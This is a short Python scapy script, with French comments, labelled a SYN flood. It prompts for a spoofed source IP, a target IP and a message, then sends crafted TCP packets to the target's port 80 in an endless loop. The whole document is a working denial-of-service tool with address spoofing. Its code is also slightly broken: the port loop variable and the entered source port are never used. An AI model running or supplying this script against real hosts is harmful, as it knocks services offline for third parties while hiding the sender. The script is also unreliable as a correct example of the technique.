#!/usr/bin/python

from scapy.all import *

def synFlood(src,tgt,message):
	for dport in range(1024,65535): #pour chaque port de destination dans cette range
		IPlayer = IP(src=src, dst=tgt)
		TCPlayer = TCP(sport=4444, dport=80) #sport = port avec lequel on envoie
		RAWlayer = Raw(load=message)
		pkt = IPlayer/TCPlayer/RAWlayer
		send(pkt)

source = input("[*] Enter source IP address to fake: ")
srcport = input("[*] Enter source port to use: ")
target = input("[*] Enter targets IP address: ")
message = input("[*] Enter message for TCP payload: ")


while True:
	synFlood(source, target, message)
